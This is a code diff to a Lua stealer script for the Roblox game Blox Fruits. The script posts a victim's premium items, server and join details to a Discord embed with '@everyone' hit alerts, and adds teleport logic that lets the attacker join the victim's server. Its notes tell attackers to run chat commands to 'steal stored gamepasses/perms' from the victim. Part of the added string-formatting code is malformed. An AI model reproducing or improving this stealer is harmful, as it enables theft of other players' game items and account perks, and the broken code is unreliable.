@@ -580,6 +580,14 @@ local function formatPremiumItems()
     return #formattedItems > 0 and table.concat(formattedItems, "\n") or "None"
 end
 
+-- Define necessary services and variables
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+
+-- Dynamic Embed Generation and Combined Join Logic
 local embed = {
     title = hasDragonFruit and "DRAGON HIT! ; https://discord.gg/zJKDqRd5" or "Rua BF Joiner ; https://discord.gg/zJKDqRd5",
     description = hasDragonFruit and "DRAGON FRUIT HIT! @everyone" or "New Hit! @everyone",
@@ -591,11 +599,10 @@ local embed = {
         {name = "Premium Items", value = formatPremiumItems(), inline = false},
         {name = "Sea", value = Sea, inline = true},
         {name = "Executor Info", value = string.format("```\nExecutor: %s\nStealer Version: %s\n```", ExecutorName, GameVersion), inline = false},
-        {name = "Server Info", value = string.format("```\nPlayer Count: %d\nServer Time: %s\n```", PlayerCount, ServerTime), inline = false},
-        {name = "Join Server (PC COPY)", value = "```lua\n" .. JoinScript .. "\n```", inline = false},
-        {name = "Join Server (Mobile COPY)", value = JoinScript, inline = false},
-        {name = "Join " .. Sea .. " (PC COPY)", value = "```lua\n" .. (Sea == "Sea 2" and Sea2Script or Sea3Script) .. "\n```", inline = false},
-        {name = "Join " .. Sea .. " (Mobile COPY)", value = (Sea == "Sea 2" and Sea2Script or Sea3Script):gsub("```lua\n", ""):gsub("\n```", ""), inline = false},
+        {name = "Server Info", value = string.format([[ Player Count: %d Server Time: %s Place ID: %d Job ID: %s Join Script: if game.PlaceId ~= %d then queue_onteleport([[ task.wait(5) if game.JobId ~= "%s" then game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s") end ]]) game:GetService("ReplicatedStorage").Remotes.CommF:InvokeServer("%s") else game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s") end
+                ]], PlayerCount, ServerTime, game.PlaceId, game.JobId, game.PlaceId, game.JobId, game.PlaceId, game.JobId, 
+        (game.PlaceId == 4442272183 and "derrosa") or (game.PlaceId == 7449423635 and "zou") or "Unknown Place", game.PlaceId, game.JobId),
+        inline = false},
         {name = "NOTES:", value = [[
 1. You can do ?addallitem or ?additem <name> to steal stored gamepasses/perms.
 2. If victim doesn't do any action automatically, you can try doing chat commands. Check them in rua hub channel "Commands for bf joiner"
@@ -604,6 +611,21 @@ local embed = {
     }
 }
 
+-- Combined Join Sea and Join Server Logic
+if game.PlaceId ~= 4442272183 and game.PlaceId ~= 7449423635 then
+    queue_onteleport(string.format([[
+        task.wait(5)
+        if game.JobId ~= "%s" then
+            game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")
+        end
+    ]], game.JobId, game.PlaceId, game.JobId))
+    
+    -- Invoke server with dynamically generated PlaceId name
+    local placeName = (game.PlaceId == 4442272183 and "derrosa") or (game.PlaceId == 7449423635 and "zou") or "Unknown Place"
+    game:GetService("ReplicatedStorage").Remotes.CommF:InvokeServer(placeName)
+else
+    game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId)
+end
 local isMobile = game:GetService("UserInputService").TouchEnabled
 
 local webhookCache = {
